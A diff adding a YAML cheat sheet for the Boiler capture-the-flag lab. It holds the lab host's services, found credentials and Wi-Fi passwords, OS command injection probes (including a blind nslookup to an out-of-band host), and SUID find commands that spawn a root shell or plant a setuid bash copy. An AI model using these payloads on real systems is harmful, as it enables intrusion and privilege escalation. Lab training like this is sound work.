@@ -1,0 +1,43 @@
+# Boiler CTF — pocket playbook 🧰
+target:
+  host: 10.201.33.188
+  services:
+    - name: http_joomla
+      paths: ["/joomla/", "/joomla/administrator/"]
+    - name: ssh
+      port: 55007
+      connect: "ssh -p 55007 <user>@10.201.33.188"
+    - name: webmin
+      port: 10000
+      version_hint: "MiniServ/1.930"
+      tls: "self-signed; add exception in lab"
+
+artifacts:
+  robots_txt:
+    paths: ["/yellow", "/not", "/a+rabbit", "/hole", "/or", "/is", "/it", "/tmp", "/.ssh"]
+    numeric_line: "079 084 108 105 ... 081"
+    decoded_token: "99b0660cd95adea327c54182baa51584"
+  deep_paste:
+    ssids:
+      - { ssid: "HIROSAKI_Free_W1-F1", password: "H_Free934!" }
+      - { ssid: "DKIF-G",            password: "Fsdf324T96" }
+  creds_found:
+    - { user: "stoner", password: "superduperp@$$no1knows", source: "backup.sh (comment)" }
+
+oscmd_injection:
+  cwe: "CWE-78"
+  owasp_top10: "A03:2021 – Injection"
+  probes:
+    visible: [";id", "|id", "&&id", "||id", "%0aid", "`id`", "$(id)"]
+    blind:   [";sleep 5", ";nslookup <token>.oast.site"]
+  quoting_breakouts:
+    single_quote: ["';id;#"]
+    double_quote: [""); id; #"]
+
+privesc:
+  suid_find:
+    check: "ls -l /usr/bin/find # look for -r-sr-xr-x"
+    root_shell: "/usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit"
+    alt:
+      - "/usr/bin/find . -maxdepth 0 -exec sh -c 'cp /bin/bash /tmp/rbash && chmod u+s /tmp/rbash' \; -quit"
+      - "/tmp/rbash -p"
